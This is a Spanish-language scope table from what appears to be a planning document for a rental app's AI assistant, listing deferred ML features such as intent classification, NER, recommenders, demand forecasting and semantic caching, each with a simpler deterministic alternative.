| **Clasificación de intención del mensaje** en lugar de la lista de palabras clave de `ia-integration.js:118-122`, que tiene falsos positivos («no me recomiendes copas»). | Un clasificador entrenado es OPCIÓN 2. | Ampliar el patrón y, sobre todo, **ofrecer** la acción en vez de ejecutarla (UX-06): un falso positivo pasa a costar un botón ignorado en lugar de una petición desperdiciada. |
| **Extracción de entidades (NER)** para sacar tipo de evento, asistentes, presupuesto y fechas del texto libre de forma general. | NER supervisado es OPCIÓN 2. | Expresiones regulares y un mapa de números en palabras (UX-02), con una pregunta explícita al usuario cuando no se detecta nada. |
| **Recomendador basado en histórico de alquileres** («clientes con eventos parecidos alquilaron…»), que sería filtrado colaborativo. | Requiere un modelo de recomendación entrenado sobre `alquileres`/`alquiler_items`. | El contexto que ya se inyecta en el prompt: los últimos 3 alquileres del cliente (`python-ia/main.py:136-147`). El modelo los usa como referencia, sin entrenar nada. |
| **Previsión de demanda de stock por temporada** para avisar de roturas antes de que ocurran. | Es un modelo de series temporales. | Nada en esta fase. Lo que sí está dentro de alcance es el tope de cantidad contra el stock actual (BUG-09). |
| **Caché semántica de respuestas** para ahorrar cuota reutilizando respuestas a preguntas parecidas. | La similitud semántica requiere embeddings. | Reducir peticiones redundantes por vías deterministas: eliminar la doble inicialización (BUG-01), no disparar recomendaciones automáticas (UX-06) y limitar por usuario (SEC-07). |
